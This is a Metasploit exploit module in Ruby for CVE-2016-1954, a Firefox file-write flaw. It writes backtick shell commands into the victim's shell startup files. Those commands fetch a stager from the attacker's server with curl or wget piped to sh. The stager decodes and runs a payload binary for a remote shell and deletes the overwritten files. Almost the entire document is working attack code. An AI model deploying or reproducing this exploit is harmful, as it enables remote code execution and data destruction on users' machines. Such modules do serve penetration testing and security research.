##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  # You have to guess the logged-in user's name.
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Firefox report-uri File Overwrite',
      'Description' => %q{
        This module abuses an arbitrary file write vulnerability in Firefox < 45.0
        to plant a .bashrc (or similar) file on the victim, ultimately resulting in
        a shell. The exploit causes a file to be written to the path of your choice
        containing backticks ` that allow us to execute shell commands. A curl or
        wget binary on the system is then used to stage a metasploit payload.

        For this module to work, you must know or guess (up to a few hundred tries)
        the username of the logged in user.

        As a warning, this module is fairly destructive and will overwrite any paths
        specified in FILES and eventually erase them. Use with caution.
      },
      'Author'         => [
        'Nicolas Golubovic', # vuln discoverer
        'evo'
      ],
      'License'     => MSF_LICENSE,
      'Arch'           => [ARCH_X86, ARCH_X86_64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],
      'Targets'        => [ ['Automatic', {}] ],
      'Platform'      => %w{ linux osx solaris unix },
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PrependFork' => true },
      'SessionTypes'   => ['shell', 'meterpreter'],
      'References' => [
        ['URL', 'https://www.mozilla.org/en-US/security/advisories/mfsa2016-17/'],
        ['URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=1243178'],
        ['CVE', '2016-1954']
      ]
    ))

    register_options([
      OptString.new('FILES', [
        true,
        'List of file paths to write shell script to',
        '/home/ubuntu/.bash_aliases,/home/user/.login,/var/root/.profile'
      ]),
      OptString.new('URIPATH', [
        true,
        'Path to the exploit. This needs to be "/" for space purposes.',
        '/'
      ])
    ], self.class)

    register_advanced_options([
      OptBool.new('UseCurl', [
        false,
        'Use curl instead of wget to stage the payload.',
        false
      ]),
      OptString.new('TmpDir', [
        false,
        'A writable temporary dir for storing the staged payload.',
        '/tmp'
      ])
    ])
  end

  def exploit
    register_file_for_cleanup(payload_path)
    super
  end

  def on_request_uri(cli, request)
    if request.headers['User-Agent'] =~ /(curl|wget)/i
      print_good("Shell script request detected. Serving payload stager.")
      send_response(cli, stager, 'Content-Type' => 'text/plain')
    else
      if request.qstring['file']
        path = request.qstring['file']
        print_status("Client loaded exploit for path #{path}.")
        send_response(cli, per_file_html, {
          'Content-Security-Policy' => "script-src 'self'; report-uri file://#{path}",
          'Content-Type' => 'text/html'
        })
      else
        print_status("Client loaded main page.")
        send_response_html(cli, main_html)
      end
    end
  end

  def files
    datastore['FILES'].split(/\s+|,/)
  end

  def main_html
    frames = files.map { |f| "<iframe src='/?file=#{Rex::Text.uri_encode(f)}'></iframe>" }
    %Q(
      <body>#{frames.join}</body>
    )
  end

  def per_file_html
    # This gets stuffed in the written JSON blob without URL encoding.
    cmd = datastore['USE_CURL'] ? 'curl' : 'wget -qO-'
    %Q(
      <body><script>`#{cmd} #{datastore['SRVHOST']}:#{datastore['SRVPORT']}|sh`</script></body>
    )
  end

  def stager
    b64 = Rex::Text.encode_base64(generate_payload_exe)
    %Q(
      echo '#{b64}' | base64 -d > /tmp/payload
      chmod +x /tmp/payload
      #{files.map { |f| "rm -f #{f}" }.join("\n") }
      /tmp/payload
    )
  end

  def payload_path
    @pname ||= Rex::Text.rand_text_alphanumeric(8)
    "#{datastore['TmpDir']}/#{@pname}"
  end

end
